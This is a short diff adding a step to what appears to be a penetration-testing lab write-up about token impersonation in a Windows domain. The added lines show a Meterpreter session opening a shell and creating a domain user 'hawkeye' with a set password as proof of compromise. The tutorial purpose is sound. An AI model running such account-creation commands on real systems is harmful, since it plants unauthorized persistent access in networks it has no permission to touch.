@@ -51,3 +51,15 @@ meterpreter > impersonate_token marvel\\administrator
 
 We can add a proof of concept to our report by creating a new user, called **hawkeye** with password as **Password1@**.
 
+```powershell
+meterpreter > shell
+
+# adding our user hawkeye
+C:\Windows\system32>net user /add hawkeye Password1@ /domain
+```
+
+#### **Example**
+
+
+![](https://i.imgur.com/oWzcnmn.png)
+
